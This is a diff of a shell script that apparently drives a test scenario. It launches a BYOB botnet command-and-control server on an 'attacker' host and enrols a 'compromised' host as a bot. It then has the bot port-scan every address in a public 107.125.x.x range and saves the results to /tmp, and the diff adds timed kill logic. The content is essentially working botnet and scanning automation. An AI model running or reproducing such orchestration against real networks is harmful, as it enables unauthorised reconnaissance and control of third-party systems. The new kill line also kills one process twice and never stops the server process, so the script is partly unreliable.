@@ -8,21 +8,21 @@ remote_kill() {
 }
 
 
-(sleep 3600 && pkill -9 -P $$ && kill -9 $$) &
 
-ssh attacker "cd ~/byob && ./server.py --background" &
-sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
-attackerPid=$1
+ssh attacker "cd ~/byob && ./server.py --background" > /dev/null 2>&1 &
+a_pid=$!
+# sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
 
 sleep 10 # let the server boot
 
-ssh compromised "byob-client" &
-sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
-compromisedPid=$!
+ssh compromised "byob-client" > /dev/null 2>&1 &
+c_pid=$!
+# sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
 
 
 sleep 5 # let the victim connect
 
+(sleep 60 && echo "killing" && (kill -9 $c_pid; kill -9 $c_pid; kill -9 $$)) &
 
 for ip in 107.125.{128..254}.{1..254}; do
     ssh attacker "byossh -t 10 compromised portscanner $ip >> /tmp/port-results && cat /tmp/port-results"
@@ -41,4 +41,5 @@ remote_kill attacker python
 sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
 
 sleep 8 # Make sure all the data downloads
+
 
